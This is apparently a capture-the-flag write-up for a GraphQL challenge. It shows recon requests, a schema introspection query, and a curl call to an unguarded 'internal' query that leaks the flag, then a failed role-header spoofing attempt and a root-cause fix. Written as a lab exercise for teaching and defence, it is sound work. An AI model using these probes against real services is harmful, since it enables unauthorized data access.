# Vireo — Beginner (153 pts)

**Target:** http://159.194.244.226:8084/
**Flag:** `kubstu{v1r30_1ntr0sp3ct10n_869998f1}`

## TL;DR

The "workplace assistant" is a Flask/Gunicorn app whose frontend is a thin
GraphQL client. The GraphQL endpoint (`/graphql`) has **introspection enabled**
and exposes a non-public `internal` query. There is **no authorization check**
on it, so an anonymous/unprivileged session (role `member`) can read the secret.

## Recon

```
curl -s http://159.194.244.226:8084/            # gunicorn, "VIREO — workplace assistant"
curl -s http://159.194.244.226:8084/static/app.js
```

`app.js` posts to the endpoint named in the inline `#vireo-strings` JSON:

```json
{"endpoint": "/graphql", ...}
```

and runs:

```graphql
query Overview { me { id name role } documents { id title snippet updatedAt } }
```

Response:

```json
{"data":{"me":{"id":"U-204","name":"Dana Whitlock","role":"member"},
 "documents":[{"id":"DOC-1041","title":"Incident response runbook", ...}]}}
```

## Exploit

1. **Introspect the schema** (introspection is not disabled):

```graphql
{ __schema { types { name kind fields { name args { name type { name kind } } type { name kind ofType { name } } } } } }
```

This reveals a `Query` field that is *not* used by the UI:

```graphql
type Query {
  me: User!
  documents: [Document!]!
  document(id: ID!): Document
  internal: Internal          # <-- not referenced anywhere in the frontend
}

type Internal {
  buildRef: String!
  deployedBy: String!
  secret: String!
}
```

2. **Call it** — no role check, returns the flag to a `member` session:

```bash
curl -s -X POST http://159.194.244.226:8084/graphql \
  -H 'Content-Type: application/json' \
  --data-binary '{"query":"{ internal { buildRef deployedBy secret } }"}'
```

```json
{"data":{"internal":{
  "buildRef":"release-2026.03.2+a91f3c",
  "deployedBy":"ci-runner-07",
  "secret":"kubstu{v1r30_1ntr0sp3ct10n_869998f1}"}}}
```

## Notes / negative results

- `document(id:)` behaves as expected (IDOR negative): `DOC-0001`, `1` → `null`.
- Spoofing `X-User-Role: admin` / `X-Role: admin` does **not** change `me.role`
  and is not required — the `internal` field is simply unguarded.

## Root cause & fix

- **Root cause:** schema-exposed admin/debug resolver with no authorization
  (broken access control / CWE-862), discoverable via GraphQL introspection
  (CWE-200 information exposure).
- **Fix:** disable introspection in production (`introspection=False`), and
  enforce authorization on `internal` (e.g. `role == "admin"` in the resolver),
  not merely by hiding it from the client.
